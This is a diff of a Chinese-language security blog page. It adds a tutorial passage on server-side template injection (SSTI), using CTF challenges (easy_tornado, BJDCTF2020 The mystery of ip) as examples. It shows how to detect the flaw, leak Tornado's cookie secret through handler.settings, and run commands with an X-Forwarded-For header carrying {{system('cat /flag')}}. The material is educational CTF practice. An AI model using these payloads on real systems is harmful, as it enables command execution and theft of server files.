-<h3 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h3><p>这道题我在做的时候试了好多方法，虽然扫描目录的时候发现了.ds_store文件但是没有权限。这个思路行不通，最后还是看了别的师傅的博客，原来是X-Forwarded-For参数可控，使用的是ssti模板注入2333….<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;&#123;system(&#39;cat .&#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/9.png" class title="Da4er"></p>
+<h4 id="2-利用"><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h4><p> 检测方法如下：</p>
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/1.png" class title="Da4er">
+<p> 当我们输入的内容，经过web模板解析后返回到html页面中，如果在web模板解析时没有进行很好的过滤就会出现SSTI模板注入漏洞。</p>
+<p>以BUU上[护网杯 2018]easy_tornado为例，当我们的filname和filehash不一样的时候会跳转到error页面。</p>
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/2.png" class title="Da4er">
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/3.png" class title="Da4er">
+<p> 当我们输入2不会返回正常的1 * 2而是ORZ</p>
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/4.png" class title="Da4er">
+<p> 证明存在SSTI漏洞<br> 使用python web模板tornado中的handler.settings可以把cookie输出</p>
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/5.png" class title="Da4er">
+<p> 这就可以证明有SSTI模板漏洞，这个漏洞在很多语言的web模板中都存在，不光只有python，因为python tornado模板使用简单，所以造成的危害更大些。</p>
+<p> 也可以使用system函数执行系统命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;命令&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>例题：[BJDCTF2020]The mystery of ip<br>题目X-Forwarded-For可控，存在模板注入，可以使用system执行系统命令。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/6.png" class title="Da4er">
 
           
         
@@ -2220,7 +2315,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">50</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2337,7 +2432,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">36.7k</span>
+    <span title="Site words total count">37.1k</span>
   
 </div>
 
@@ -2347,7 +2442,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共36.7k字</span>
+  <span class="post-count">博客全站共37.1k字</span>
 </div>
 
 
